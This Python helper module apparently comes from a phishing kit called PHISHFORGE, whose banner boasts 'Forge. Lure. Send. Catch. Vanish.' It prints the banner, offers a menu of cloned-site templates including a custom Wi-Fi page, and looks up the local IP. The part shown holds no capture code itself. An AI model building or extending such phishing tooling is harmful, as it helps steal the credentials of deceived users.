# core/utils.py
import os
import socket

def banner():
    print("""
╔═══════════════════════════════════════════════════════════╗
║                     PHISHFORGE v2.0                       ║
║               Forge. Lure. Send. Catch. Vanish.           ║
╚═══════════════════════════════════════════════════════════╝
    """)


def select_template():
    templates = [d for d in os.listdir("sites") if os.path.isdir(f"sites/{d}")]
    if not templates:
        print("[!] No templates found in /sites/")
        exit()

    print("\n[TEMPLATES]")
    for i, t in enumerate(templates, 1):
        print(f" [{i:02d}] {t.replace('_', ' ').title()}")
    print(" [99] Custom Page")
    print(" [00] Exit")

    while True:
        choice = input("\n[SELECT] → ").strip()
        if choice == "99":
            return "custom_wifi"
        if choice == "00":
            print("[EXIT] Goodbye.")
            exit()
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(templates):
                return templates[idx]
        except ValueError:
            pass
        print("[!] Invalid choice. Try again.")


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"